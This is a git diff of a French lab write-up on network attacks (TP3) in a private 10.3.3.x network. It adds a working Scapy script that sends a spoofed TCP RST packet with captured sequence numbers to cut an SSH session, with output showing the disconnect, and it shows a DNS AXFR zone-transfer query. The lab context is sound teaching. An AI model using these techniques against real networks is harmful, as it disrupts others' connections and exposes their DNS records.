@@ -450,8 +450,7 @@ dns.tp3.b2 resolved to 10.3.3.1
 🌞 **Preuve avec un client**
 
 ~~~html
-(cmeyer© kali) -[~]
-$ curl web.tp3.b2
+[cmeyer@kali ~]$ curl web.tp3.b2
 
 <!doctype html>
 <html>
@@ -476,8 +475,7 @@ $ curl web.tp3.b2
 🌞 **Requêter l'enregistrement AXFR**
 
 ~~~
-(cmeyer© kali) -[~]
-$ dig @dns.tp3.b2 tp3.b2 AXFR
+[attaquant@localhost ~]$ dig @dns.tp3.b2 tp3.b2 AXFR
 
 ; <<>> DiG 9.20.3-1-Debian <<>> @dns.tp3.b2 tp3.b2 AXFR
 (1 server found)
@@ -513,11 +511,30 @@ print(answer[DNS].summary())
 
 🌞 **Mettre en place une attaque TCP RST**
 
-- il faut une connexion TCP établie dans le LAN
-- si vous visitez le site web avec un navigateur, un navigateur maintient la connexion TCP active un moment normalement (contrairement à `curl`)
-- vous pouvez aussi faire une connexion SSH entre deux machines par exemple, ce sera encore plus parlant et visible car la connexion SSH va couper d'un coup : c'est le but de l'attaque
-- **envoyer un ou plusieurs paquets TCP RST pour terminer une connexion TCP en cours**
-  - il faut une connexion TCP en cours
-  - il faut repérer les numéros de séquence
-  - envoyer un TCP RST à un participant, en spoofant l'identité de l'autre
-  - avec les bons numéros à l'intérieur
+~~~python
+from scapy.all import *
+
+rst_packet = IP(src="10.3.3.1", dst="10.3.3.2") / \
+            TCP(sport=56100, dport=22, flags="R", seq=2819881537, ack=3424035478)
+
+send(rst_packet)
+
+print(f"Paquet RST envoyé de {"10.3.3.1"}:{56100} vers {"10.3.3.2"}:{22} avec Seq={2819881537} et Ack={3424035478}")
+~~~
+
+~~~
+[attaquant@localhost ~]$ python3 rst.py
+ip src >> 10.3.3.1
+ip dst >> 10.3.3.2
+port src >> 56100
+port dst >> 22
+Seq nb >> 2819881537
+Ack nb >> 3424035478
+[ 3029.781295 ] device enp0s3 entered promiscuous mode
+[ 3029.781295 ] device enp0s3 left promiscuous mode
+~~~
+
+~~~
+[cmeyer@kali ~]$ aclient_loop: send disconnect: Broken pipe
+~~~
+
